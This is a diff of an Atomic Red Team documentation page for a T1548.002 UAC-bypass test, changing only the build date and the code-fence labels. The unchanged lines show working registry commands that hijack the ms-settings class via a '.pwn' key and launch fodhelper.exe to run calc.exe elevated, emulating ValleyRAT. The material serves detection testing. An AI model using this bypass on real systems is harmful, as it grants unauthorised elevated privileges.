@@ -6,7 +6,7 @@ generated: "true"
 attack_technique_id: "T1548.002"
 attack_technique_name: "Abuse Elevation Control Mechanism: Bypass User Account Control"
 source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1548.002/T1548.002.yaml"
-build_date: "2026-04-26 14:38:40"
+build_date: "2026-04-26 17:02:13"
 executor: "command_prompt"
 aliases:
   - "b6f4645c-34ea-4c7c-98f2-d5a2747efb08"
@@ -42,7 +42,7 @@ This atomic designed to simulate the UAC bypassed made by ValleyRAT by adding cu
 
 ### Command
 
-```commandprompt
+```cmd
 reg add "HKEY_CURRENT_USER\Software\Classes\.pwn\Shell\Open\command" /ve /d "C:\Windows\System32\calc.exe" /f
 
 reg add "HKEY_CURRENT_USER\Software\Classes\ms-settings\CurVer" /ve /d ".pwn" /f
@@ -53,7 +53,7 @@ start fodhelper.exe
 
 ### Cleanup
 
-```commandprompt
+```cmd
 reg delete "HKEY_CURRENT_USER\Software\Classes\.pwn\Shell\Open\command" /ve /f
 reg delete "HKEY_CURRENT_USER\Software\Classes\ms-settings\CurVer" /ve /f
 ```
